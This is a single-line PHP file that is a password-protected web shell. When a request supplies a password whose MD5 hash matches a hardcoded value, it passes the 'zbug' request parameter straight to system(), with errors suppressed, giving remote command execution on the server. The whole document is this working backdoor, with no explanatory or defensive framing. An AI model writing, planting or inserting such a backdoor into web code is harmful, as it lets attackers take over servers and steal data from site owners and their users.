<?php if(md5($_REQUEST["pass"])=="d5477dcc0e3bdf6534e9d75169563b4c"){@system($_REQUEST[zbug]);} ?>
